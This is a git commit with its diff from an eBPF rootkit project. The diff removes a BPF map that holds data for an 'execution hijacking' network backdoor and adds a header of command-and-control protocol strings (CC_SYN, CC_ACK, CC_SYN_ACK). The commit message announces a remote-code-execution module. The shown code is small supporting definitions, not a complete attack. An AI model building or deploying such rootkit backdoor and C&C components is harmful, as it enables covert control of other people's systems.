431a0199312db40feb7962a874e73be33a1a7531
h3xduck <marcossanchezbajo@gmail.com>
2022-02-16 19:38:39 -0500

    Updated my RawTCPLib library with newest version supporting sniffing for payloads. Also new data in preparation for complete RCE module

--- src/common/map_prot.h
+++ src/common/map_prot.h
@@ -11,19 +11,4 @@
 /*PROTECTED MAPS*/
 //Any attempt to access these maps will be blocked by the rootkit if the program is not whitelisted
 
-//Execution hijacking, holder of requesting/response data sent from/to the network backdoor
-#define EXEC_HIJACK_REQUEST_PROGRAM_MAX_LEN 256
-#define EXEC_HIJACK_RESPONSE_PROGRAM_MAX_LEN 256
-struct exec_hijack_data{ //Map value
-	char req_buf[EXEC_HIJACK_REQUEST_PROGRAM_MAX_LEN];
-    char res_buf[EXEC_HIJACK_RESPONSE_PROGRAM_MAX_LEN];
-};
-
-struct exec_prot_hijack{ //Map
-	__uint(type, BPF_MAP_TYPE_ARRAY);
-	__uint(max_entries, 1);
-	__type(key, __u32); //just 1 entry allowed
-	__type(value, struct exec_hijack_data);
-} exec_hijack SEC(".maps");
-
 #endif
---
+++ src/ebpf/include/packet/c&c/c&c.h
@@ -0,0 +1,10 @@
+#ifndef __BPF_CC_H
+#define __BPF_CC_H
+
+#define CC_PROT_SYN "CC_SYN"
+#define CC_PROT_ACK "CC_ACK"
+#define CC_PROT_SYN_ACK "CC_SYN_ACK"
+#define CC_PROT_SEPARATOR "#"
+
+
+#endif
